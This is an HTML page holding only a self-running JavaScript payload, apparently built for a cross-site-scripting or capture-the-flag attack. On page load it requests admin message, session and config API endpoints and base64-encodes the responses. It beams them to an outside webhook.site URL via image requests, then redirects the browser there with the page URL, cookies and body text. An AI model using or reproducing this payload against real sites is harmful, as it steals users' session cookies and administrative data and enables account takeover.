<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
        
        async function leakData() {
            // List of high-value API endpoints
            const apis = [
                "/api/admin/messages",
                "/api/auth/session",
                "/api/admin/config"
            ];

            for (let url of apis) {
                try {
                    const r = await fetch(url);
                    const data = await r.text();
                    // If we get a valid response, beam it back
                    if (r.ok) {
                        new Image().src = `${webh}/api_leak?path=${btoa(url)}&res=${btoa(data.substring(0, 2000))}`;
                    }
                } catch(e) {}
            }

            // Ultimate Fallback: Scrape the entire DOM and Cookies
            const context = {
                url: window.location.href,
                cookies: document.cookie,
                body: document.body.innerText.substring(0, 1000)
            };
            location.href = `${webh}/final?ctx=${btoa(JSON.stringify(context))}`;
        }

        leakData();
    </script>
</body>
</html>
